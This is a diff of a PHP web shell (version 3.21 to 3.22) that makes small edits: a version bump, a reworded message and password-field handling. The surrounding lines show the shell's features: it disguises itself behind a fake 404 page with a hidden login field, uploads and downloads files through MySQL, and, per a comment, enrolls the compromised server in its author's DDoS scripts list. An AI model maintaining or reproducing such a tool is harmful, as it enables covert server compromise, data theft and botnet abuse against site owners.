@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 3.21;
+$version            = 3.22;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -1592,7 +1592,7 @@ function mysqlfile(doing){
     formfoot();
     p('<form action="' . $self . '" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile" onSubmit="window.onbeforeunload = null;">');
     p('<h2>Upload file</h2>');
-    p('<p><b>This operation the DB user must has FILE privilege</b></p>');
+    p('<p><b>The DB user must have the FILE privilege for this operation.</b></p>');
     p('<p>Save path(fullpath): <input onmouseover="this.focus();" class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
     p('<h2>Download file</h2>');
     p('<p>File: <input onmouseover="this.focus();" class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
@@ -3658,7 +3658,7 @@ function makeinput($arg = array())
     $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
     $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
     $hf           = "";
-    if ($arg['type'] == "text") {
+    if ($arg['type'] == "text" || $arg['type'] == "password") {
         $hf = "onmouseover=\"this.focus();\" ";
     }
     if ($arg['newline']) {
